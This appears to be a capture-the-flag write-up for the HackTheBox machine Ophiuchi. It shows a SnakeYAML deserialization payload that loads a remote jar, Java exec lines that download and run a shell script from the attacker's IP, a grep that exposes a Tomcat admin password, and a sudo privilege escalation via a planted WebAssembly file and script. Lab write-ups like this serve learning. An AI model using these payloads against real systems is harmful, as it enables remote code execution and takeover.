---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/3jXJwYvHzxk/0.jpg
layout: post
media_subpath: /assets/posts/2021-07-03-snakeyaml-go-webassembly-ophiuchi-hackthebox
tags:
- go
- hackthebox
- linux
- sudo
- webassembly
- yaml
title: SnakeYAML, Go & WebAssembly - Ophiuchi @ HackTheBox
---

We are going to solve Ophiuchi a 30-point machine on HackTheBox that involves a YAML parser vulnerability and a custom program we can execute with sudo, which loads a web assembly file and executes a shell script without using the absolute path.

{% youtube 3jXJwYvHzxk %}

## Notes

**SnakeYAML Parser vulnerability**

- https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858
- https://github.com/artsploit/yaml-payload

Change payload to:

```
Runtime.getRuntime().exec("wget 10.10.14.97/x -O /tmp/x");
Runtime.getRuntime().exec("/bin/sh /tmp/x");
```

Compile:

```
javac yaml-payload/src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf payload.jar -C yaml-payload/src/ .
```

Send Exploit:

```
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.97/payload.jar"]
  ]]
]
```

**Get Admin Password**

```
grep -ir "password" .
/tomcat/conf/tomcat-users.xml:<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
```

WebAssembly "main.c":

```
int info() {
    return 1;
}
```

Compile with emscripten:

```
sudo docker run --rm -v $(pwd):/src -u $(id -u):$(id -g) emscripten/emsdk emcc --no-entry main.c -s WASM=1 -o main.html -s "EXPORTED_FUNCTIONS=['_info']";
```

Transfer & Execute:

```
cd /tmp
curl 10.10.14.97/main.wasm > main.wasm
curl 10.10.14.97/x > deploy.sh
chmod +x deploy.sh
sudo /usr/bin/go run /opt/wasm-functions/index.go
```